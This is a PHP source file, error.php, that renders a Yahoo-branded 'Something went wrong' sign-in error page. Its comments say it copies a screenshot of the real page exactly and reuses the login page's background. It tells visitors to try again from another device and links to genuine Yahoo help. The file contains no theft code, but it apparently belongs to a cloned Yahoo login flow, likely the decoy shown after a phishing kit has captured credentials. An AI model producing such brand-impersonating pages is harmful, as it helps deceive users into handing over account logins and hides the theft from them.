<?php
// error.php — "Something went wrong" — matches screenshot 3 exactly
require 'helpers.php';
session_start();

// Uses login purple background (same as index)
page_open('Something went wrong - Yahoo', 'err-bg');
?>

<div class="error-card">

  <!-- Circle warning icon — exact match to screenshot 3 -->
  <div class="warn-icon">!</div>

  <h1 class="error-title">Something went wrong</h1>
  <p class="error-sub">
    We could not sign you in. Try again from a different device.
  </p>

  <!-- "Go to Help" purple pill button -->
  <a href="https://io.help.yahoo.com/contact/index?page=contact&y=PROD_ACCT&locale=en_US&crumb=zZetTTCLqaWYCOwUIrKOYw" class="btn-help">Go to Help</a>

  <!-- "Close" link -->
  <a href="../index.php" class="close-link">Close</a>

</div>

<?php page_close(); ?>
